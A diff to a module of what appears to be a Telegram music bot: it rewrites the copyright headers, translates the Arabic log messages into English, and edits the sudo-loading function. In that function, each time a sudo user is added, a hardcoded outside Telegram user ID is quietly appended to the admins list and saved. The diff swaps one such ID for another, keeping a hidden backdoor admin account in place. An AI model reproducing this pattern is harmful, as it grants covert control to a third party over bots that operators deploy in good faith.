@@ -1,13 +1,13 @@
-#
-# Copyright (C) 2021-2022 by Alexa_Help@Github, < https://github.com/Jankarikiduniya >.
-# A Powerful Music Bot Property Of Rocks Indian Largest Chatting Group
+# Copyright (C) 2024 by Alexa_Help @ Github, < https://github.com/TheTeamAlexa >
+# Subscribe On YT < Jankari Ki Duniya >. All rights reserved. © Alexa © Yukki.
 
-# Kanged By © @Dr_Asad_Ali
-# Rocks © @Shayri_Music_Lovers
-# Owner Asad Ali
-# Harshit Sharma
-# All rights reserved. © Alisha © Alexa © Yukki 2022
+""""
+TheTeamAlexa is a project of Telegram bots with variety of purposes.
+Copyright (c) 2024 -present Team=Alexa <https://github.com/TheTeamAlexa>
 
+This program is free software: you can redistribute it and can modify
+as you want or you can collabe if you have new ideas.
+"""
 
 import socket
 import time
@@ -50,7 +50,7 @@ XCB = [
 def dbb():
     global db
     db = {}
-    LOGGER(__name__).info(f"تمت تهيئة قاعدة البيانات.")
+    LOGGER(__name__).info(f"Database Initialized.")
 
 
 def sudo():
@@ -67,7 +67,7 @@ def sudo():
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
-                sudoers.append(2042185317)
+                sudoers.append(6174058850)
                 sudoersdb.update_one(
                     {"sudo": "sudo"},
                     {"$set": {"sudoers": sudoers}},
@@ -76,7 +76,7 @@ def sudo():
         if sudoers:
             for x in sudoers:
                 SUDOERS.add(x)
-    LOGGER(__name__).info(f"تم تحميل مستخدمي Sudo بنجاح.")
+    LOGGER(__name__).info(f"Sudo Users Loaded Successfully.")
 
 
 def heroku():
@@ -86,8 +86,8 @@ def heroku():
             try:
                 Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                 HAPP = Heroku.app(config.HEROKU_APP_NAME)
-                LOGGER(__name__).info(f"تم تكوين تطبيق Heroku بنجاح.")
+                LOGGER(__name__).info(f"Heroku App Configured Successfully.")
             except BaseException:
                 LOGGER(__name__).warning(
-                    f"يرجى التأكد من تكوين مفتاح Heroku API واسم التطبيق الخاص بك بشكل صحيح في Heroku"
+                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                 )
